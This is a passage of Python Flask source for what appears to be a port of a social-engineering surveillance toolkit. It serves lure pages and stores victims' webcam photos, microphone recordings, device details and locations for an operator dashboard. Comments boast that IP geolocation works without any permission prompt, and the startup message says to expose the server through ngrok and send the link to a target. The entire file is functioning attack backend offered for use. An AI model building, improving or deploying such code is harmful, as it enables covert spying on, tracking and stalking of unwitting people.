                        typed.append({
                            "ts": mtime,
                            "template": template_dir.name,
                            "type": _classify_collector_text(data),
                            "message": data[:MAX_EVENT_MESSAGE],
                        })

    response = make_response("\n".join(results))
    response.headers["X-Events"] = json.dumps(typed[:50])
    return response


# --- list_templates.php → /list_templates ---
@app.route("/list_templates", methods=["POST", "GET"])
def list_templates():
    """Return JSON list of template directory names (authenticated only)."""
    if not is_logged_in():
        return jsonify({"error": "unauthorized"}), 401
    if not TEMPLATES_DIR.exists():
        return jsonify([])
    dirs = sorted([
        d.name for d in TEMPLATES_DIR.iterdir() if d.is_dir()
    ])
    return jsonify(dirs)


# --- get_captures → /get_captures (new endpoint for dashboard) ---
@app.route("/get_captures", methods=["GET"])
def get_captures():
    """Return JSON list of captured images and audio files for the media gallery."""
    if not is_logged_in():
        return jsonify({"error": "unauthorized"}), 401
    captures = []

    # Scan images directory
    if IMAGES_DIR.exists():
        for f in sorted(IMAGES_DIR.iterdir(), reverse=True):
            if f.is_file() and f.suffix.lower() in (".png", ".jpg", ".jpeg", ".gif"):
                captures.append({
                    "type": "image",
                    "url": f"/images/{f.name}",
                    "timestamp": datetime.fromtimestamp(f.stat().st_mtime).strftime("%Y-%m-%d %H:%M:%S"),
                    "filename": f.name
                })

    # Scan sounds directory
    if SOUNDS_DIR.exists():
        for f in sorted(SOUNDS_DIR.iterdir(), reverse=True):
            if f.is_file() and f.suffix.lower() in (".wav", ".mp3", ".ogg"):
                captures.append({
                    "type": "audio",
                    "url": f"/sounds/{f.name}",
                    "timestamp": datetime.fromtimestamp(f.stat().st_mtime).strftime("%Y-%m-%d %H:%M:%S"),
                    "filename": f.name
                })

    return jsonify(captures)


# ──────────────────────────────────────────────
# Template-specific PHP replacements
# ──────────────────────────────────────────────

# --- Generic handler.php replacement (device info) ---
@app.route("/templates/<template_name>/handler.php", methods=["POST"])
@app.route("/templates/<template_name>/handler", methods=["POST"])
def template_handler(template_name):
    """Save device info to result.txt (replaces handler.php in each template).

    Original camera handler.php, kept verbatim in behavior:
        if ($_SERVER['REQUEST_METHOD'] == "POST") {
            $data = $_POST['data'];
            file_put_contents("result.txt", $data);
        }
    Flask note: the route already only accepts POST, and an empty "data"
    field is a no-op write (same visible effect as the PHP original).
    """
    limited = rate_limit(COLLECT_LIMITER, "collect")
    if limited:
        return limited
    directory = safe_template_dir(template_name, must_exist=True)
    data = request.form.get("data", "")
    if data:
        write_result_file(directory, data)
        log_collector_event(template_name, data, event_type="info")
    return "", 204


# --- generic /templates/<name>/post collector (form data or JSON body) ---
@app.route("/templates/<template_name>/post.php", methods=["POST"])
@app.route("/templates/<template_name>/post", methods=["POST"])
def template_post(template_name):
    """Accept the payloads posted by the added templates and store them safely."""
    limited = rate_limit(COLLECT_LIMITER, "collect")
    if limited:
        return limited
    directory = safe_template_dir(template_name, must_exist=True)

    data = request.form.get("data") or request.form.get("value") or ""
    if not data:
        payload = request.get_json(silent=True)
        if isinstance(payload, dict):
            data = payload.get("data") or json.dumps(payload)
        elif request.get_data():
            data = request.get_data(as_text=True)

    if data:
        write_result_file(directory, data)
        log_collector_event(template_name, data)
    return "", 204


def _as_float(value):
    """Best-effort float conversion that never raises."""
    try:
        number = float(value)
    except (TypeError, ValueError):
        return None
    return number if -180.0 <= number <= 180.0 else None


def _extract_capture_location():
    """Read the optional GPS payload sent with a capture.

    Returns ``(text, lat, lon)``; missing values come back as ``""`` / ``None``.
    """
    raw = request.form.get("location") or request.form.get("location_data") or ""
    lat = request.form.get("lat")
    lon = request.form.get("lon")

    if raw.strip().startswith("{"):
        try:
            payload = json.loads(raw)
        except (TypeError, ValueError):
            payload = None
        if isinstance(payload, dict):
            raw = str(payload.get("location") or "")
            lat = payload.get("lat", lat)
            lon = payload.get("lon", lon)

    return raw.strip()[:200], _as_float(lat), _as_float(lon)


def _ip_location_lines(lat, lon):
    """Permission-free location fallback: geolocate the visitor's IP.

    The client never asks the browser for GPS (no permission prompt), so when a
    post arrives without coordinates we resolve a coarse position ourselves —
    cached, HTTPS only, private addresses skipped.
    """
    if lat is not None and lon is not None:
        return []
    geo = get_ip_geolocation(get_client_ip())
    city = geo.get("city") or ""
    if not city or city == "Unknown":
        return []
    place = ", ".join(p for p in (city, geo.get("country")) if p and p != "Unknown")
    isp = geo.get("isp") or ""
    if isp and isp != "Unknown":
        place = f"{place} / {isp}"
    lines = [f"IP location : {place}"]
    if geo.get("lat") or geo.get("lon"):
        # The dashboard turns this line into a map marker. The ?q= form is
        # the canonical coordinate URL - /place/ is a search path and can
        # resolve to unrelated results.
        lines.append(
            f"Google Map Link : https://www.google.com/maps?q={float(geo['lat']):.6f},{float(geo['lon']):.6f}"
        )
    return lines


# --- camera_temp/post.php → /templates/camera_temp/post ---
# Original StormBrain camera component (post.php), faithfully ported to Flask:
#   $date = date('dMYHis'); $imageData = $_POST['cat'];
#   $unencodedData = base64_decode($imageData);
#   $data = 'cam'.$date.'.png';
#   $fp = fopen('../../images/'.$data, 'wb'); fwrite($fp, $unencodedData); fclose($fp);
#   file_put_contents("result.txt", "Image File Was Saved ! > /images/".$data); exit();
# The filename scheme (cam + dMYHis) and the exact result.txt first line are kept.
# Hardening kept so the current UI keeps working: size limit, PNG check, atomic
# result.txt write, plus optional GPS/IP-location lines appended AFTER the
# original first line, and a JSON reply (the new UI posts with dataType: json).
@app.route("/templates/camera_temp/post.php", methods=["POST"])
@app.route("/templates/camera_temp/post", methods=["POST"])
def camera_post():
    """Save base64 webcam image (replaces camera_temp/post.php)."""
    limited = rate_limit(COLLECT_LIMITER, "camera")
    if limited:
        return limited

    image_data = request.form.get("cat", "")
    location_text, lat, lon = _extract_capture_location()
    if not image_data:
        # No image bytes: accept a location-only post (GPS without a granted
        # camera), so the fix position is stored even when capture is impossible.
        if not location_text and lat is None and lon is None:
            return "", 204
        result_lines = ["Location received (no image - camera denied or blocked)"]
        if location_text:
            result_lines.append(f"Location : {location_text}")
        if lat is not None and lon is not None:
            # The dashboard turns this line into a map marker. Canonical
            # ?q= coordinate URL (the old /place/ path could search-resolve
            # to an unrelated place).
            result_lines.append(f"Google Map Link : https://www.google.com/maps?q={lat:.6f},{lon:.6f}")
        # No GPS? The server resolves the position from the visitor's IP instead,
        # so location works without any permission being requested.
        result_lines.extend(_ip_location_lines(lat, lon))

        inbox = "\n".join(result_lines)
        write_result_file(
            safe_template_dir("camera_temp", must_exist=True),
            inbox
        )
        log_collector_event(
            "camera_temp", inbox, event_type="location",
            lat=lat, lon=lon,
        )

        return jsonify({
            "status": "ok",
            "file": "",
            "bytes": 0,
            "location": location_text,
            "lat": lat,
            "lon": lon,
        })
    if len(image_data) > MAX_UPLOAD_BYTES:
        return jsonify({"error": "payload too large"}), 413

    try:
        decoded = base64.b64decode(image_data)
    except (ValueError, TypeError):
        return jsonify({"error": "invalid base64 payload"}), 400

    if not decoded.startswith(b"\x89PNG\r\n\x1a\n"):
        return jsonify({"error": "payload is not a PNG image"}), 400

    date_str = datetime.now().strftime("%d%b%Y%H%M%S")
    filename = secure_filename(f"cam{date_str}{secrets.token_hex(2)}.png")
    filepath = IMAGES_DIR / filename
    filepath.write_bytes(decoded)

    result_lines = [f"Image File Was Saved ! > /images/{filename}"]
    if location_text:
        result_lines.append(f"Location : {location_text}")
    if lat is not None and lon is not None:
        # The dashboard turns this line into a map marker. Canonical ?q=
        # coordinate URL - the old /place/ path could land on an unrelated
        # search result.
        result_lines.append(f"Google Map Link : https://www.google.com/maps?q={lat:.6f},{lon:.6f}")
    # Permission-free fallback: IP geolocation when the client sent no GPS fix.
    result_lines.extend(_ip_location_lines(lat, lon))

    inbox = "\n".join(result_lines)
    write_result_file(
        safe_template_dir("camera_temp", must_exist=True),
        inbox
    )
    log_collector_event(
        "camera_temp", inbox, event_type="image",
        file=filename, lat=lat, lon=lon,
    )

    return jsonify({
        "status": "ok",
        "file": filename,
        "bytes": len(decoded),
        "location": location_text,
        "lat": lat,
        "lon": lon,
    })


# --- microphone/upload.php → /templates/microphone/upload ---
@app.route("/templates/microphone/upload.php", methods=["POST"])
@app.route("/templates/microphone/upload", methods=["POST"])
def microphone_upload():
    """Save uploaded audio file (replaces microphone/upload.php)."""
    limited = rate_limit(COLLECT_LIMITER, "microphone")
    if limited:
        return limited

    audio_file = request.files.get("audio_data")
    if audio_file is None:
        return "", 204

    payload = audio_file.read()
    if not payload:
        return "", 204
    # Server-side size cap. Flask's MAX_CONTENT_LENGTH only bounds the whole
    # request body, so a single oversized file still has to be rejected here.
    if len(payload) > MAX_UPLOAD_BYTES:
        return jsonify({"error": "payload too large"}), 413
    # Content sniffing instead of trusting the extension: a real RIFF/WAVE file
    # starts with "RIFF" + 4 size bytes + "WAVE".
    if not (payload[:4] == b"RIFF" and payload[8:12] == b"WAVE"):
        return jsonify({"error": "payload is not a WAVE audio file"}), 400

    safe_name = secure_filename(audio_file.filename or "") or "audio"
    if not safe_name.lower().endswith(".wav"):
        safe_name = f"{safe_name}.wav"
    # Random suffix + secure_filename => user input never reaches the path.
    filename = secure_filename(f"{Path(safe_name).stem[:48]}_{secrets.token_hex(3)}.wav")
    filepath = SOUNDS_DIR / filename
    filepath.write_bytes(payload)

    inbox = f"Audio File Was Saved ! > /sounds/{filename}"
    write_result_file(
        safe_template_dir("microphone", must_exist=True),
        inbox
    )
    log_collector_event("microphone", inbox, event_type="audio", file=filename)
    return jsonify({"status": "ok", "file": filename})


# --- weather/error.php and nearyou/error.php replacement ---
@app.route("/templates/<template_name>/error.php", methods=["POST"])
@app.route("/templates/<template_name>/error", methods=["POST"])
def template_error(template_name):
    """Handle geolocation errors (replaces error.php)."""
    limited = rate_limit(COLLECT_LIMITER, "collect")
    if limited:
        return limited
    directory = safe_template_dir(template_name, must_exist=True)

    message = (
        request.form.get("Denied")
        or request.form.get("Una")
        or request.form.get("Time")
        or request.form.get("Unk")
        or "Geolocation is not supported!"
    )
    write_result_file(directory, message)
    log_collector_event(template_name, message, event_type="error")
    return "", 204


# ──────────────────────────────────────────────
# Static file serving
# ──────────────────────────────────────────────

# Serve template static files (HTML, CSS, JS, images within templates)
@app.route("/templates/<path:filepath>")
def serve_template(filepath):
    """Serve public template assets; harvested results are never exposed over HTTP."""
    filename = Path(filepath).name.lower()
    if filename.startswith(".") or filename.startswith("result."):
        abort(404)
    # Never disclose server-side script source: the original camera component
    # shipped post.php/handler.php as executable endpoints. Under Flask those
    # URLs are handled by camera_post/template_handler, so a direct GET must
    # behave like the PHP runtime (execute, not download) -> 404, no disclosure.
    if filename.endswith((".php", ".phtml", ".phar", ".php5", ".phps")):
        abort(404)

    # Track visitor when accessing templates
    if not is_logged_in() and filename == "index.html":
        template_name = filepath.split("/")[0] if "/" in filepath else "unknown"
        save_visitor_info(get_client_ip(), template_name)

    return send_from_directory(str(TEMPLATES_DIR), filepath)


# Serve captured images
@app.route("/images/<path:filepath>")
def serve_image(filepath):
    """Serve captured image files to authenticated operators only."""
    if not is_logged_in():
        abort(404)
    return send_from_directory(str(IMAGES_DIR), filepath)


# Serve captured audio files
@app.route("/sounds/<path:filepath>")
def serve_sound(filepath):
    """Serve captured sound files to authenticated operators only."""
    if not is_logged_in():
        abort(404)
    return send_from_directory(str(SOUNDS_DIR), filepath)


# ──────────────────────────────────────────────
# Archived sessions (data of the previous runs)
# ──────────────────────────────────────────────

@app.route("/api/sessions")
def api_sessions():
    """List the archived sessions (previous runs) - manifest metadata only."""
    if not is_logged_in():
        return jsonify({"error": "unauthorized"}), 401
    return jsonify(session_store.list_sessions())


@app.route("/api/sessions/<session_id>/media")
def api_session_media(session_id):
    """Return the captures stored in an archived session."""
    if not is_logged_in():
        return jsonify({"error": "unauthorized"}), 401
    media = session_store.session_media(session_id)
    if media is None:
        return jsonify({"error": "session not found"}), 404
    return jsonify(media)


@app.route("/sessions/<session_id>/<kind>/<path:filepath>")
def serve_session_file(session_id, kind, filepath):
    """Serve archived media to authenticated operators only."""
    if not is_logged_in() or kind not in ("images", "sounds"):
        abort(404)
    directory = session_store.session_dir(session_id)
    if directory is None:
        abort(404)
    return send_from_directory(str(directory / kind), filepath)



# ──────────────────────────────────────────────
# Statistics & Activity API
# ──────────────────────────────────────────────

# Activity log: loaded from disk on start, persisted on every append
activity_log = _load_activity_log()

@app.route("/api/stats")
def api_stats():
    """Return dashboard statistics."""
    if not is_logged_in():
        return jsonify({"error": "unauthorized"}), 401

    image_count = _count_media(IMAGES_DIR, (".png", ".jpg", ".jpeg", ".gif"))
    audio_count = _count_media(SOUNDS_DIR, (".wav", ".mp3", ".ogg"))

    # Honest counters: recorded visitors (and their coordinates), not log length
    visitors = _load_visitors()
    located_visitors = sum(1 for v in visitors if v.get("lat") or v.get("lon"))
    location_count = max(sum(1 for e in activity_log if e.get("type") == "location"), located_visitors)

    return jsonify({
        "connections": len(visitors),
        "images": image_count,
        "audio": audio_count,
        "locations": location_count
    })


@app.route("/api/activity")
def api_activity():
    """Return recent activity feed (last 50 entries)."""
    if not is_logged_in():
        return jsonify({"error": "unauthorized"}), 401
    return jsonify(activity_log[-50:])


@app.route("/api/activity/add", methods=["POST"])
def api_activity_add():
    """Add an activity entry (authenticated dashboard only)."""
    if not is_logged_in():
        return jsonify({"error": "unauthorized"}), 401
    limited = rate_limit(API_LIMITER, "activity")
    if limited:
        return limited

    data = request.get_json(silent=True) or {}
    entry = {
        "type": str(data.get("type", "info"))[:32],
        "message": str(data.get("message", ""))[:500],
        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }
    add_activity(entry)
    return jsonify({"status": "ok"})


@app.route("/api/events")
def api_events():
    """Return the forensic event tail (append-only JSONL, newest last).

    Query: ?limit=N (1..500, default 100). Authenticated only. This is the
    non-destructive replacement for polling /receiver in a loop: refresh
    never loses history, every entry carries {ts, template, ip_hash, type,
    message, file?, lat?, lon?}.
    """
    if not is_logged_in():
        return jsonify({"error": "unauthorized"}), 401
    return jsonify(read_events_tail(request.args.get("limit", 100)))


@app.route("/api/events/export")
def api_events_export():
    """Download the full forensic log as JSON (chain-of-custody bundle)."""
    if not is_logged_in():
        return jsonify({"error": "unauthorized"}), 401
    events = read_events_tail(MAX_EVENTS_TAIL)
    response = make_response(json.dumps({
        "generated": _utc_now_iso(),
        "count": len(events),
        "events": events,
    }, indent=2, ensure_ascii=False))
    response.headers["Content-Type"] = "application/json"
    response.headers["Content-Disposition"] = (
        "attachment; filename=storm-events.json"
    )
    return response


@app.route("/api/change_password", methods=["POST"])
def change_password():
    """Change admin password (stored as a salted hash, survives restarts)."""
    if not is_logged_in():
        return jsonify({"error": "unauthorized"}), 401

    limited = rate_limit(LOGIN_LIMITER, "password")
    if limited:
        return limited

    data = request.get_json(silent=True) or {}
    current = data.get("current", "")
    new_pass = data.get("new", "")

    username = session.get("IAm-logined", "")
    if not verify_credentials(username, current):
        return jsonify({"status": "error", "message": "Current password incorrect"}), 400
    if len(new_pass) < 8:
        return jsonify({"status": "error", "message": "New password must be at least 8 characters"}), 400

    set_admin_password(new_pass)
    return jsonify({"status": "ok", "message": "Password changed!"})


@app.route("/api/server_info")
def server_info():
    """Return server status info."""
    if not is_logged_in():
        return jsonify({"error": "unauthorized"}), 401

    import platform
    settings = {}
    if SETTINGS_FILE.exists():
        try:
            with open(SETTINGS_FILE, "r", encoding="utf-8") as f:
                stored = json.load(f)
            if isinstance(stored, dict):
                settings = {"version": stored.get("version", "3.0"),
                            "is_start": stored.get("is_start", False)}
        except (json.JSONDecodeError, OSError):
            settings = {}

    return jsonify({
        "platform": platform.system(),
        "python": platform.python_version(),
        "version": settings.get("version", "3.0"),
        "ngrok_token_set": bool(settings.get("ngrok_token", "")),
        "templates": sorted([d.name for d in TEMPLATES_DIR.iterdir() if d.is_dir()]) if TEMPLATES_DIR.exists() else []
    })


@app.route("/api/visitors")
def api_visitors():
    """Return visitor information with IP geolocation."""
    if not is_logged_in():
        return jsonify({"error": "unauthorized"}), 401

    visitors_file = STORM_WEB / "visitors" / "visitors.json"
    try:
        if visitors_file.exists():
            with open(visitors_file, "r") as f:
                visitors = json.load(f)
            return jsonify(visitors)
        else:
            return jsonify([])
    except Exception as e:
        return jsonify([])


@app.route("/api/geo/intel")
def api_geo_intel():
    """Resolve country + city for every IP found in the logs.

    Feeds the map: the panel lights each country and pins each city with the
    position derived from the victim traffic (result.txt / events.jsonl),
    without asking the browser for any permission.
    """
    if not is_logged_in():
        return jsonify({"error": "unauthorized"}), 401
    limited = rate_limit(API_LIMITER, "geo")
    if limited:
        return limited
    return jsonify(geo_intel_from_logs())


# ==================== TEMPLATE MANAGEMENT ====================

@app.route("/api/templates", methods=["GET"])
def api_templates_list():
    """Return all templates with metadata."""
    if not is_logged_in():
        return jsonify({"error": "unauthorized"}), 401

    templates = []
    if TEMPLATES_DIR.exists():
        for template_dir in sorted(TEMPLATES_DIR.iterdir()):
            if template_dir.is_dir():
                template_info = {
                    "name": template_dir.name,
                    "type": "unknown",
                    "description": "Custom template",
                    "created": datetime.fromtimestamp(template_dir.stat().st_ctime).strftime("%Y-%m-%d %H:%M:%S")
                }
                
                # Check for metadata file
                metadata_file = template_dir / "metadata.json"
                if metadata_file.exists():
                    try:
                        with open(metadata_file, "r") as f:
                            metadata = json.load(f)
                            template_info.update(metadata)
                    except:
                        pass
                
                templates.append(template_info)
    
    return jsonify(templates)


@app.route("/api/templates/<template_name>", methods=["GET", "POST", "DELETE"])
def api_template_crud(template_name):
    """CRUD operations for templates."""
    if not is_logged_in():
        return jsonify({"error": "unauthorized"}), 401

    template_dir = safe_template_dir(template_name, must_exist=False)

    if request.method == "GET":
        # Get template details
        if not template_dir.is_dir():
            return jsonify({"error": "Template not found"}), 404

        try:
            with open(template_dir / "index.html", "r", encoding="utf-8", errors="ignore") as f:
                html_content = f.read()

            metadata_file = template_dir / "metadata.json"
            metadata = {}
            if metadata_file.exists():
                with open(metadata_file, "r", encoding="utf-8") as f:
                    metadata = json.load(f)
            
            return jsonify({
                "name": template_name,
                "html": html_content,
                "metadata": metadata
            })
        except Exception:
            app.logger.exception("Template read failed for %s", template_name)
            return jsonify({"error": "Failed to read template"}), 500
    
    elif request.method == "POST":
        # Update template
        data = request.get_json(silent=True) or {}

        if not template_dir.is_dir():
            return jsonify({"error": "Template not found"}), 404

        try:
            # Update HTML if provided
            if "html" in data:
                html_payload = str(data["html"])
                if len(html_payload.encode("utf-8", errors="ignore")) > MAX_UPLOAD_BYTES:
                    return jsonify({"error": "Template HTML too large"}), 413
                tmp_file = template_dir / "index.tmp.html"
                tmp_file.write_text(html_payload, encoding="utf-8")
                tmp_file.replace(template_dir / "index.html")

            # Update metadata if provided
            if "metadata" in data:
                with open(template_dir / "metadata.json", "w") as f:
                    json.dump(data["metadata"], f, indent=2)
            
            return jsonify({"status": "success"})
        except Exception:
            # Never return str(e): raw exception text can leak filesystem
            # paths and internals to the client. Traceback stays server-side.
            app.logger.exception("Template update failed for %s", template_name)
            return jsonify({"error": "Failed to update template"}), 500
    
    elif request.method == "DELETE":
        # Delete template
        if not template_dir.exists():
            return jsonify({"error": "Template not found"}), 404
        
        try:
            import shutil
            shutil.rmtree(template_dir)
            return jsonify({"status": "success"})
        except Exception:
            app.logger.exception("Template delete failed for %s", template_name)
            return jsonify({"error": "Failed to delete template"}), 500


@app.route("/api/templates/create", methods=["POST"])
def api_template_create():
    """Create a new template."""
    if not is_logged_in():
        return jsonify({"error": "unauthorized"}), 401

    data = request.get_json(silent=True) or {}
    template_name = data.get("name", "").strip()
    template_type = data.get("type", "custom")
    description = data.get("description", "Custom template")
    html_content = data.get("html", "")
    
    if not template_name:
        return jsonify({"error": "Template name is required"}), 400
    if not TEMPLATE_NAME_RE.match(template_name):
        return jsonify({"error": "Invalid template name (use A-Z, a-z, 0-9, _ or -)"}), 400
    if len(str(html_content).encode("utf-8", errors="ignore")) > MAX_UPLOAD_BYTES:
        return jsonify({"error": "Template HTML too large"}), 413

    template_dir = TEMPLATES_DIR / template_name

    if template_dir.exists():
        return jsonify({"error": "Template already exists"}), 400

    try:
        template_dir.mkdir(exist_ok=True)

        # Create index.html
        with open(template_dir / "index.html", "w", encoding="utf-8") as f:
            f.write(html_content)
        
        # Create metadata.json
        metadata = {
            "type": template_type,
            "description": description,
            "created": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }
        with open(template_dir / "metadata.json", "w") as f:
            json.dump(metadata, f, indent=2)
        
        return jsonify({"status": "success", "name": template_name})
    except Exception:
        app.logger.exception("Template create failed for %s", template_name)
        return jsonify({"error": "Failed to create template"}), 500


@app.route("/api/templates/<template_name>/duplicate", methods=["POST"])
def api_template_duplicate(template_name):
    """Duplicate an existing template."""
    if not is_logged_in():
        return jsonify({"error": "unauthorized"}), 401

    source_dir = safe_template_dir(template_name, must_exist=True)

    data = request.get_json(silent=True) or {}
    new_name = str(data.get("new_name") or f"{template_name}_copy").strip()
    if not TEMPLATE_NAME_RE.match(new_name):
        return jsonify({"error": "Invalid template name (use A-Z, a-z, 0-9, _ or -)"}), 400

    dest_dir = TEMPLATES_DIR / new_name
    if dest_dir.exists():
        return jsonify({"error": "Destination template already exists"}), 400

    try:
        shutil.copytree(source_dir, dest_dir)
        
        # Update metadata
        metadata_file = dest_dir / "metadata.json"
        if metadata_file.exists():
            with open(metadata_file, "r") as f:
                metadata = json.load(f)
            metadata["name"] = new_name
            metadata["created"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            metadata["copied_from"] = template_name
            with open(metadata_file, "w") as f:
                json.dump(metadata, f, indent=2)
        
        return jsonify({"status": "success", "new_name": new_name})
    except Exception:
        app.logger.exception("Template duplicate failed for %s", template_name)
        return jsonify({"error": "Failed to duplicate template"}), 500


# ==================== WEBSOCKET EVENTS ====================
# Only registered when flask-socketio is installed. The dashboard polls over HTTP,
# so the absence of this layer is not a functional regression.

if SOCKETIO_AVAILABLE:

    @socketio.on('connect')
    def handle_connect():
        """Handle client connection."""
        if session.get("IAm-logined"):
            emit('connected', {'status': 'success'})
        else:
            emit('error', {'message': 'Unauthorized'})

    @socketio.on('disconnect')
    def handle_disconnect():
        """Handle client disconnection."""
        emit('disconnected', {'status': 'success'})

    @socketio.on('subscribe_activity')
    def handle_subscribe_activity():
        """Subscribe to activity updates."""
        if session.get("IAm-logined"):
            # Send recent activity
            emit('activity_update', {'data': activity_log[-10:]})

    @socketio.on('subscribe_stats')
    def handle_subscribe_stats():
        """Subscribe to statistics updates."""
        if not session.get("IAm-logined"):
            emit('error', {'message': 'Unauthorized'})
            return
        visitors = _load_visitors()
        location_count = max(
            sum(1 for e in activity_log if e.get("type") == "location"),
            sum(1 for v in visitors if v.get("lat") or v.get("lon")),
        )
        emit('stats_update', {'data': {
            "connections": len(visitors),
            "images": _count_media(IMAGES_DIR, (".png", ".jpg", ".jpeg", ".gif")),
            "audio": _count_media(SOUNDS_DIR, (".wav", ".mp3", ".ogg")),
            "locations": location_count,
        }})


# ──────────────────────────────────────────────
# Entry point
# ──────────────────────────────────────────────

def run_server(port=2525, debug=False):
    """Start the server (Socket.IO when available, plain HTTP otherwise)."""
    print(f"\n [+] Web Panel Link : http://localhost:{port}")
    print(f"\n [+] Please Run NGROK On Port {port} AND Send Link To Target > ngrok http {port}\n")
    if socketio is not None:
        try:
            # allow_unsafe_werkzeug: without eventlet/gevent the development server is
            # used. This is a local testing tool; put gunicorn/gevent in front of it
            # if you ever expect real traffic.
            socketio.run(app, host="0.0.0.0", port=port, debug=debug, allow_unsafe_werkzeug=True)
            return
        except TypeError:
            # flask-socketio < 5.3 does not know the allow_unsafe_werkzeug flag
            socketio.run(app, host="0.0.0.0", port=port, debug=debug)
            return
    print(" [i] flask-socketio is not installed - serving plain HTTP (dashboard polling).")
    app.run(host="0.0.0.0", port=port, debug=debug)


if __name__ == "__main__":
    run_server()
